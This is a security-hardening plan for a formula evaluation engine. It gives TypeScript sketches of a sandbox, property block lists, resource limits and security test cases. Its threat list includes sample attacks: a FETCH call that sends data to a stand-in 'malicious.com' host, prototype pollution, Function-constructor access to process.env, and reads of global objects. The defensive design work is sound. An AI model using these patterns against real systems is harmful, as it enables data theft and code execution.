# EPIC: Code Injection Prevention & Security Hardening

**Epic ID:** EPIC-009  
**Epic Name:** Formula Security & Code Injection Prevention  
**Status:** 📋 Planned  
**Priority:** HIGH (Security-Critical)  
**Estimated Duration:** 5-7 days  
**Dependencies:** Evaluation Engine (Complete), Parser (Complete)  
**Lead:** Senior Front End Architect  
**Created:** October 31, 2025  

---

## Executive Summary

Harden the formula evaluation engine and parser against code injection attacks, prevent execution of dangerous operations, and establish security boundaries to protect the application and user data. This epic addresses potential security vulnerabilities in user-authored formulas before they can be exploited.

**Key Value:** Prevents malicious or accidental execution of dangerous code, protects application integrity, and ensures formulas execute within safe boundaries.

---

## Vision

Enable secure formula execution by:
- **Preventing code injection** - Block attempts to execute arbitrary code outside formula syntax
- **Sandboxing evaluation** - Restrict access to dangerous JavaScript operations
- **Input sanitization** - Validate and sanitize all user inputs before execution
- **Resource limits** - Prevent denial-of-service through resource exhaustion
- **Safe function registry** - Whitelist allowed operations, block dangerous ones
- **Audit logging** - Track potentially suspicious formula patterns

---

## Security Threats to Address

### 1. JavaScript Injection Attacks

**Threat:** User crafts formula that injects JavaScript code.

**Example Attack:**
```
$result = '); alert("XSS"); //
```

**Mitigation:**
- Parser rejects any non-formula syntax
- Tokenizer validates all input characters
- AST only contains approved node types
- Evaluator never uses `eval()` or `Function()` constructors

---

### 2. Prototype Pollution

**Threat:** User manipulates JavaScript object prototypes.

**Example Attack:**
```
$obj.__proto__.isAdmin = true
```

**Mitigation:**
- Disable prototype access in evaluation context
- Object operations only on own properties
- Freeze core JavaScript prototypes during evaluation
- Sanitize property access paths

---

### 3. Function Constructor Access

**Threat:** User gains access to Function constructor to execute arbitrary code.

**Example Attack:**
```
$func = $someFunction.constructor("return process.env")()
```

**Mitigation:**
- No access to `.constructor` property
- Function registry is a closed whitelist
- No dynamic function creation
- All functions pre-defined and validated

---

### 4. Resource Exhaustion (DoS)

**Threat:** User creates formula that consumes excessive resources.

**Example Attack:**
```
// Infinite loop
WHILE TRUE DO
  $x = $x + 1
END

// Massive array
$huge = []
FOR $i IN 1..99999999 DO
  $huge = CONCAT($huge, [$i])
END
```

**Mitigation:**
- Maximum iteration limits (10,000 default)
- Memory allocation limits
- Execution timeout (configurable, e.g., 5 seconds)
- Maximum string length limits
- Maximum array/list size limits

---

### 5. External Resource Access

**Threat:** User attempts to access external resources or APIs.

**Example Attack:**
```
// Hypothetical if we had network functions
$data = FETCH("https://malicious.com/steal?data=" + $sensitiveInfo)
```

**Mitigation:**
- No network access functions in registry
- No file system access
- No local storage access
- Closed function whitelist

---

### 6. Information Disclosure

**Threat:** User attempts to extract sensitive system information.

**Example Attack:**
```
// Attempting to access global objects
$secret = $window.localStorage
$info = $global.process.env
```

**Mitigation:**
- Evaluation context has no access to global objects
- No `window`, `global`, `process`, etc.
- Only approved variables and attributes accessible
- Context isolation

---

## Architecture Impact Analysis

### 1. Tokenizer Security (Tokenizer.ts) - **LOW Complexity**

**Changes Needed:**
- Character whitelist validation
- Reject unexpected Unicode characters
- Prevent comment-based injection
- Length limits on tokens

**Example:**
```typescript
export class Tokenizer {
  private static ALLOWED_CHARS = /^[a-zA-Z0-9_$@\s\+\-\*\/\(\)\[\]\{\}\.,;:'"<>=!&|]$/;
  private static MAX_TOKEN_LENGTH = 1000;
  
  validateCharacter(char: string): void {
    if (!Tokenizer.ALLOWED_CHARS.test(char)) {
      throw new SecurityError(
        `Invalid character detected: "${char}". Only alphanumeric and formula operators allowed.`
      );
    }
  }
  
  checkTokenLength(token: string): void {
    if (token.length > Tokenizer.MAX_TOKEN_LENGTH) {
      throw new SecurityError('Token exceeds maximum length');
    }
  }
}
```

---

### 2. Parser Security (FormulaParser.ts) - **MEDIUM Complexity**

**Changes Needed:**
- Strict syntax validation
- AST node type whitelist
- Depth limit for nested expressions
- Input sanitization

**Example:**
```typescript
export class FormulaParser {
  private static MAX_EXPRESSION_DEPTH = 50;
  private nestingDepth = 0;
  
  parse(): ASTNode {
    // Validate nesting depth to prevent stack overflow
    this.nestingDepth++;
    if (this.nestingDepth > FormulaParser.MAX_EXPRESSION_DEPTH) {
      throw new SecurityError('Expression nesting too deep');
    }
    
    const node = this.parseExpression();
    
    // Validate node type is allowed
    if (!this.isAllowedNodeType(node.type)) {
      throw new SecurityError(`Forbidden AST node type: ${node.type}`);
    }
    
    this.nestingDepth--;
    return node;
  }
  
  isAllowedNodeType(type: string): boolean {
    const ALLOWED_NODES = [
      'Assignment', 'BinaryExpression', 'UnaryExpression',
      'IfStatement', 'Variable', 'Literal', 'FunctionCall',
      'PropertyAccess', 'ForLoopStatement', 'WhileLoopStatement',
      'SwitchStatement', 'ReturnStatement'
    ];
    return ALLOWED_NODES.includes(type);
  }
}
```

---

### 3. Evaluator Security (Evaluator.ts) - **HIGH Complexity**

**Changes Needed:**
- Execution timeout
- Memory limits
- Safe property access only
- Prototype protection
- No eval/Function constructor

**Example:**
```typescript
export class Evaluator {
  private startTime: number = 0;
  private readonly maxExecutionTime: number = 5000; // 5 seconds
  private readonly maxIterations: number = 10000;
  private readonly maxArraySize: number = 100000;
  private readonly maxStringLength: number = 1000000; // 1MB
  
  evaluate(node: ASTNode, context: ExecutionContext): any {
    // Start execution timer on entry
    if (this.startTime === 0) {
      this.startTime = Date.now();
    }
    
    // Check timeout
    this.checkTimeout();
    
    // Evaluate based on node type
    switch (node.type) {
      case 'PropertyAccess':
        return this.evaluatePropertyAccessSafe(node, context);
      // ... other cases
    }
  }
  
  checkTimeout(): void {
    const elapsed = Date.now() - this.startTime;
    if (elapsed > this.maxExecutionTime) {
      throw new SecurityError(
        `Execution timeout: Formula exceeded ${this.maxExecutionTime}ms limit`
      );
    }
  }
  
  evaluatePropertyAccessSafe(node: PropertyAccessNode, context: ExecutionContext): any {
    const object = this.evaluate(node.object, context);
    const property = node.property;
    
    // Block dangerous properties
    const BLOCKED_PROPERTIES = [
      '__proto__', 'constructor', 'prototype',
      '__defineGetter__', '__defineSetter__',
      '__lookupGetter__', '__lookupSetter__'
    ];
    
    if (BLOCKED_PROPERTIES.includes(property)) {
      throw new SecurityError(
        `Access to property "${property}" is not allowed for security reasons`
      );
    }
    
    // Only access own properties
    if (!Object.prototype.hasOwnProperty.call(object, property)) {
      return undefined;
    }
    
    return object[property];
  }
  
  validateArraySize(array: any[]): void {
    if (array.length > this.maxArraySize) {
      throw new SecurityError(`Array size exceeds maximum allowed (${this.maxArraySize})`);
    }
  }
  
  validateStringLength(str: string): void {
    if (str.length > this.maxStringLength) {
      throw new SecurityError(`String length exceeds maximum allowed (${this.maxStringLength})`);
    }
  }
}
```

---

### 4. Function Registry Security (FunctionRegistry.ts) - **MEDIUM Complexity**

**Changes Needed:**
- Closed whitelist of functions
- Input validation for all functions
- Safe implementations only
- No dynamic registration

**Example:**
```typescript
export class FunctionRegistry {
  private static readonly SAFE_FUNCTIONS: Map<string, SafeFunction> = new Map([
    // Math functions
    ['ABS', { impl: Math.abs, validator: validateNumber }],
    ['ROUND', { impl: Math.round, validator: validateNumber }],
    ['MAX', { impl: Math.max, validator: validateNumberArray }],
    
    // String functions
    ['UPPER', { impl: (s: string) => s.toUpperCase(), validator: validateString }],
    ['LENGTH', { impl: (s: string) => s.length, validator: validateString }],
    
    // List functions (safe implementations)
    ['CONCAT', { impl: this.safeConcat, validator: validateArrays }],
    ['FILTER', { impl: this.safeFilter, validator: validateArrayAndPredicate }]
  ]);
  
  getFunction(name: string): SafeFunction | null {
    // Only return from whitelist
    return FunctionRegistry.SAFE_FUNCTIONS.get(name.toUpperCase()) || null;
  }
  
  // Prevent dynamic registration
  registerFunction(name: string, impl: Function): void {
    throw new SecurityError('Dynamic function registration is disabled for security');
  }
  
  private static safeConcat(arr1: any[], arr2: any[]): any[] {
    const result = [...arr1, ...arr2];
    
    // Validate result size
    if (result.length > 100000) {
      throw new SecurityError('Concatenated array exceeds maximum size');
    }
    
    return result;
  }
}

interface SafeFunction {
  impl: Function;
  validator: (args: any[]) => void;
}

function validateNumber(args: any[]): void {
  if (args.length !== 1 || typeof args[0] !== 'number') {
    throw new TypeError('Function requires a single number argument');
  }
}

function validateString(args: any[]): void {
  if (args.length !== 1 || typeof args[0] !== 'string') {
    throw new TypeError('Function requires a single string argument');
  }
}
```

---

### 5. Context Isolation (Context.ts) - **MEDIUM Complexity**

**Changes Needed:**
- No global object access
- Frozen scope chain
- Variable sandbox
- No prototype chain manipulation

**Example:**
```typescript
export class ExecutionContext {
  private readonly scopes: Map<string, any>[] = [];
  private readonly allowedVariables: Set<string>;
  
  constructor(allowedVariables: string[]) {
    this.scopes = [new Map()];
    this.allowedVariables = new Set(allowedVariables);
    
    // Freeze the scope to prevent prototype pollution
    Object.freeze(this.scopes);
  }
  
  getVariable(name: string): any {
    // Only allow access to approved variables
    if (!this.allowedVariables.has(name) && !name.startsWith('$')) {
      throw new SecurityError(
        `Access to variable "${name}" is not allowed. Only formula variables are accessible.`
      );
    }
    
    // Search scopes (from innermost to outermost)
    for (let i = this.scopes.length - 1; i >= 0; i--) {
      const scope = this.scopes[i];
      if (scope.has(name)) {
        return scope.get(name);
      }
    }
    
    throw new ReferenceError(`Variable ${name} is not defined`);
  }
  
  setVariable(name: string, value: any): void {
    // Validate variable name
    if (!this.isValidVariableName(name)) {
      throw new SecurityError(`Invalid variable name: ${name}`);
    }
    
    // Set in current scope
    const currentScope = this.scopes[this.scopes.length - 1];
    currentScope.set(name, value);
  }
  
  isValidVariableName(name: string): boolean {
    // Only allow alphanumeric + underscore + $
    return /^[\$a-zA-Z_][\$a-zA-Z0-9_]*$/.test(name);
  }
  
  // Prevent access to global objects
  getAllowedGlobals(): string[] {
    return []; // No global access
  }
}
```

---

### 6. Error Messages - **LOW Complexity**

**Changes Needed:**
- Sanitize error messages
- Don't leak system information
- Clear security messages for users
- Logging for security events

**Example:**
```typescript
export class SecurityError extends Error {
  constructor(message: string, private readonly context?: any) {
    super(message);
    this.name = 'SecurityError';
    
    // Log security event (server-side in production)
    this.logSecurityEvent();
  }
  
  getUserMessage(): string {
    // Return safe message to user (no internals)
    return this.message;
  }
  
  getAuditMessage(): string {
    // Detailed message for audit log (server-side only)
    return `${this.message} | Context: ${JSON.stringify(this.context)}`;
  }
  
  private logSecurityEvent(): void {
    // In production, send to security monitoring
    console.warn('[SECURITY]', this.getAuditMessage());
  }
}
```

---

## Implementation Phases

### Phase 1: Tokenizer & Parser Hardening (1-2 days)

**Tasks:**
1. Add character whitelist validation to tokenizer
2. Add token length limits
3. Add AST node type whitelist to parser
4. Add expression depth limit
5. Test with malicious inputs

**Deliverables:**
- Tokenizer rejects invalid characters
- Parser rejects deep nesting
- AST only contains approved nodes

---

### Phase 2: Evaluator Security (2-3 days)

**Tasks:**
1. Add execution timeout mechanism
2. Implement safe property access
3. Block dangerous properties (`__proto__`, `constructor`)
4. Add array/string size limits
5. Add iteration count tracking
6. Test resource exhaustion scenarios

**Deliverables:**
- Execution timeout working
- Prototype pollution prevented
- Resource limits enforced

---

### Phase 3: Function Registry Hardening (1-2 days)

**Tasks:**
1. Create closed whitelist of safe functions
2. Add input validation for all functions
3. Disable dynamic function registration
4. Implement safe versions of list operations
5. Test each function for security issues

**Deliverables:**
- Function whitelist established
- All functions validated
- No dynamic registration

---

### Phase 4: Context Isolation (1 day)

**Tasks:**
1. Prevent global object access
2. Validate variable names
3. Freeze scope chain
4. Test isolation boundaries

**Deliverables:**
- No access to `window`, `global`, etc.
- Variables properly sandboxed

---

### Phase 5: Security Testing & Documentation (1 day)

**Tasks:**
1. Create security test suite
2. Test all attack vectors
3. Document security boundaries
4. Create security guidelines for formula authors
5. Add security warnings to UI

**Deliverables:**
- Comprehensive security tests
- Security documentation
- User-facing security guidelines

---

## Security Test Cases

### Test Case 1: JavaScript Injection
```typescript
test('Rejects JavaScript injection attempt', () => {
  const formula = '$result = "); alert("XSS"); //"';
  expect(() => evaluateFormula(formula)).toThrow(SecurityError);
});
```

### Test Case 2: Prototype Pollution
```typescript
test('Prevents prototype pollution', () => {
  const formula = '$obj.__proto__.isAdmin = true';
  expect(() => evaluateFormula(formula)).toThrow(SecurityError);
});
```

### Test Case 3: Resource Exhaustion
```typescript
test('Prevents infinite loop DoS', () => {
  const formula = 'WHILE TRUE DO $x = $x + 1 END';
  expect(() => evaluateFormula(formula)).toThrow(SecurityError);
  expect(() => evaluateFormula(formula)).toThrow(/iteration/i);
});
```

### Test Case 4: Function Constructor Access
```typescript
test('Prevents Function constructor access', () => {
  const formula = '$func = $someFunc.constructor("return 1")()';
  expect(() => evaluateFormula(formula)).toThrow(SecurityError);
});
```

### Test Case 5: Global Access
```typescript
test('Prevents access to global objects', () => {
  const formula = '$data = $window.localStorage';
  expect(() => evaluateFormula(formula)).toThrow(SecurityError);
});
```

---

## Security Guidelines for Formula Authors

### ✅ Safe Patterns

```
// Safe variable operations
$total = $price * $quantity

// Safe conditionals
IF $amount > 100 THEN $discount = 0.10 END

// Safe loops (within limits)
FOR $item IN $list DO
  $sum = $sum + $item
END

// Safe function calls (whitelist)
$rounded = ROUND($value)
$upperName = UPPER($name)
```

### ❌ Blocked Patterns

```
// Blocked: Prototype access
$obj.__proto__.admin = true

// Blocked: Constructor access
$func.constructor("code")

// Blocked: Global access
$window.localStorage

// Blocked: Excessive resources
FOR $i IN 1..999999999 DO ... END

// Blocked: Invalid characters
$result = @import "malicious"
```

---

## Configuration

```typescript
export interface SecurityConfig {
  maxExecutionTime: number;      // Default: 5000ms
  maxIterations: number;          // Default: 10000
  maxArraySize: number;           // Default: 100000
  maxStringLength: number;        // Default: 1000000
  maxExpressionDepth: number;     // Default: 50
  maxTokenLength: number;         // Default: 1000
  enableAuditLogging: boolean;    // Default: true
  strictMode: boolean;            // Default: true
}

export const DEFAULT_SECURITY_CONFIG: SecurityConfig = {
  maxExecutionTime: 5000,
  maxIterations: 10000,
  maxArraySize: 100000,
  maxStringLength: 1000000,
  maxExpressionDepth: 50,
  maxTokenLength: 1000,
  enableAuditLogging: true,
  strictMode: true
};
```

---

## Audit Logging

### Logged Events

1. **Security violations** - All SecurityError throws
2. **Resource limit hits** - Timeout, iteration limit, memory limit
3. **Suspicious patterns** - Attempted dangerous property access
4. **Failed validations** - Invalid syntax, disallowed functions

### Log Format

```typescript
interface SecurityAuditLog {
  timestamp: string;
  eventType: 'security_violation' | 'resource_limit' | 'validation_failure';
  severity: 'low' | 'medium' | 'high' | 'critical';
  message: string;
  formulaSnippet?: string;  // First 100 chars
  userId?: string;          // If available
  metadata?: any;
}
```

---

## Future Enhancements

1. **CSP Integration** - Content Security Policy headers for additional browser-level protection
2. **Formula Signing** - Cryptographic signatures for trusted formulas
3. **Permission System** - Different security levels for different users
4. **Static Analysis** - Pre-execution security scanning
5. **Sandboxed Execution** - Web Workers for complete isolation
6. **Rate Limiting** - Prevent abuse through request throttling

---

## Success Criteria

- ✅ All injection attack vectors blocked
- ✅ Resource exhaustion prevented
- ✅ Prototype pollution prevented
- ✅ No access to global objects
- ✅ Comprehensive security test suite
- ✅ Clear security documentation
- ✅ Audit logging implemented
- ✅ User-facing security guidelines

---

## References

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- JavaScript Security Best Practices
- Content Security Policy (CSP) Guidelines
- Secure Coding Standards

---

## Related EPICs

- **EPIC-007:** Loops and Switch/Case (adds iteration limits for security)
- **EPIC-008:** Variable Verbalization (requires input sanitization)
- **Evaluation Engine:** Core security boundary
